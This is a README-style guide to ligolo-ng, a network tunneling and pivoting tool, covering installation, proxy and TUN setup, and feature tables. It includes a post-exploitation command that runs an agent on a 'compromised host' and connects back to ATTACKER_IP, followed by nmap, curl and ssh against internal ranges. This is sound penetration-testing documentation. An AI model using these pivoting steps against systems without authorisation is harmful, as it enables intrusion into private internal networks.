---
title: ligolo-ng
category: tunneling
tags:
  - pivoting
  - tunneling
  - post-exploitation
  - network
platform:
  - linux
  - windows
  - macos
official_docs: https://docs.ligolo.ng/
source: https://github.com/nicocha30/ligolo-ng
last_updated: 2025-12-27
---

# ligolo-ng

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Quick Start](#quick-start)
  - [Proxy Setup](#proxy-setup)
  - [Agent Connection](#agent-connection)
- [Key Features](#key-features)
- [Documentation](#documentation)

## Overview

Ligolo-ng is an advanced tunneling and pivoting tool that creates a userland network stack using TUN interfaces. Unlike traditional SOCKS proxies or TCP/UDP forwarders, it allows direct network access to remote networks without requiring proxychains.

The tool uses Gvisor to create a virtual network stack, translating packets sent to a TUN interface and transmitting them to the agent on the remote network. This enables running tools like nmap directly against internal networks with full TCP/UDP/ICMP support.

**Key advantages over alternatives:**

- No SOCKS proxy or proxychains required
- Full TCP, UDP, and ICMP support
- Agent runs without privileges
- 100+ Mbps throughput
- Automatic route management

## Installation

Download pre-built binaries from the [releases page](https://github.com/nicocha30/ligolo-ng/releases).

**Components:**

- **Proxy**: Runs on your attack machine (requires root for TUN interface)
- **Agent**: Runs on compromised host (no privileges required)

```bash
# Download latest release
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_linux_amd64.tar.gz

# Extract
tar -xzf ligolo-ng_proxy_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_linux_amd64.tar.gz
```

## Quick Start

### Proxy Setup

1. Create TUN interface on your attack machine:

```bash
# Linux
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Add route to target network (example: 10.10.0.0/24)
sudo ip route add 10.10.0.0/24 dev ligolo
```

2. Start the proxy:

```bash
./proxy -selfcert -laddr 0.0.0.0:11601
```

### Agent Connection

1. Transfer agent to compromised host and connect back:

```bash
./agent -connect ATTACKER_IP:11601 -ignore-cert
```

2. In proxy console, select the agent and start tunnel:

```
ligolo-ng >> session
? Specify a session: 1 - user@target - 10.10.0.50:54321

[Agent: user@target] >> start
[Agent: user@target] >> INFO: Starting tunnel...
```

3. You can now access the internal network directly:

```bash
nmap -sT -Pn 10.10.0.0/24
curl http://10.10.0.100/
ssh user@10.10.0.200
```

## Key Features

| Feature | Description |
|---------|-------------|
| TUN Interface | Direct network access without SOCKS/proxychains |
| Web UI | Beautiful web interface for managing agents (v0.8+) |
| Multiplayer | Multiple operators can share tunnels |
| Auto-route | Automatic route and interface management |
| Daemon Mode | Run as a background service |
| Agent Kill | Remotely terminate agents |
| Websocket | Support for websocket connections |
| Let's Encrypt | Automatic TLS certificate configuration |

## Documentation

| File | Description |
|------|-------------|
| [README.md](README.md) | This file - overview and quick start |
| [techniques.md](techniques.md) | Complete pivoting guide with practical scenarios |
| [official_docs.md](official_docs.md) | Official documentation from GitHub |

**External Resources:**

- [Official Documentation](https://docs.ligolo.ng/)
- [GitHub Repository](https://github.com/nicocha30/ligolo-ng)
- [Releases](https://github.com/nicocha30/ligolo-ng/releases)

## Notes

- The proxy requires root/admin to create TUN interfaces
- Use `--unprivileged` or `-PE` flags with nmap to avoid false positives
- Supports TCP, UDP, and ICMP (echo requests)
